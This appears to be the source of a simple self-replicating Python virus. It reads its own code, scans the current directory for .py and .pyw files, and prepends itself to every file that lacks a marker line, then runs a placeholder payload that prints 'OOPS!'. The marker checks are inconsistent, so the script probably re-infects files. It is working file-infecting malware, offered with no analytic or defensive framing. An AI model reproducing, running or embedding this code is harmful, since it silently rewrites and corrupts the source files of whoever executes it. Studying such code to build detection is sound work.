import sys
import glob

code = []

with open(sys.argv[0], "r") as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "HI!":
        self_replicating_part = True
    if not self_replicating_part:
        code.append(line)
    if line == "BYE!\n":
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    with open(file, "r") as f:
        file_code = f.readlines()

    impacted = False

    for line in file_code:
        if line == "HI!\n":
            impacted = True
            break

    if not impacted:
        final_code = []
        final_code.extend(code)
        final_code.extend("\n")
        final_code.extend(file_code)

        with open(file, "w") as f:
            f.writelines(final_code)


def bad_code():
    print("OOPS!")


bad_code()
